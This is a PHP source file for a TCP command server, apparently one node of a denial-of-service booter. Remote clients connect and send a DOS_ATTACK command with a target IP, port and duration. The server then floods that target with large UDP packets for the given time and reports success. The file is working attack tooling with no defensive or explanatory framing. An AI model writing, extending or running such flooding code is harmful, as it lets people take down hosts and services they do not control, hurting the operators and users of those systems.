<?php //server.php
if(!file_exists('./server.conf.php')){
	die('ERROR: Can\'t find server config.');
}
define('server', TRUE);
require './server.conf.php';

ini_set("default_socket_timeout", 6000);
$banlist = array( //banned IP addresses
	'8.8.8.8', //example IP
	'1.1.1.1' //example IP
);

$socket = stream_socket_server('tcp://0.0.0.0:'.$server['port'], $errno, $errstr);
if(!$socket){
  echo "$errstr ($errno)\r\n";
}else{
	echo 'Started server successfully...'."\r\n";
	while($conn = stream_socket_accept($socket)){
		while(is_resource($conn)){
			$data = trim(fread($conn, 1024));
			echo $data."\n";
			$d = explode(' ', $data);
			$d = array_pad($d, 10, '');

			if($d[0] == 'QUIT'){
				fclose($conn);
				exit;
			}
			
			if($d[0] == 'IDENTIFY'){
				if(in_array($d[1], $banlist)){
					fwrite($conn, 'ERROR banlist'."\r\n");
					fclose($conn);
				}else{
					fwrite($conn, 'WELCOME'."\r\n");
				}
			}
			
			if($d[0] == 'DOS_ATTACK'){
				ignore_user_abort(TRUE);
				set_time_limit(0);
				$mt = $server['max_flooding_time'];
				if(!filter_var($d[1], FILTER_VALIDATE_IP)){
					fwrite($conn, 'ERROR ip'."\r\n");
				}else{
					if($d[2] > 65535 || $d[2] < 1){
						fwrite($conn, 'ERROR port'."\r\n");
						$d[2] = rand(1,65535); //randomise port when invalid
					}
					if($d[3] > $mt || $d[3] < 1){
						fwrite($conn, 'ERROR time'."\r\n");
					}else{
						$dos_attack = fsockopen('udp://'.$d[1], $d[2]);
						$packet = 'X';
						for($i=0;$i<65535;$i++){
							$packet .= rand(1,65535).'X';
						}
						$time = time()+$d[3];
						$packets = 0;
						while(1){
							if(time() > $time){
								if(!isset($error)){
									fwrite($conn, 'Successfully flooded '.$d[1].':'.$d[2].' for '.$d[3].' seconds.'."\r\n");
									break;
								}else{
									fwrite($conn, $error."\r\n");
									break;
								}
							}

							if($dos_attack){
								fwrite($dos_attack, $packet);
							}else{
								$error = 'Well, I fucked up, I couldn\'t send shit.';
							}
						}
					}
				}
			}
		}
		break;
	}
	fclose($socket);
}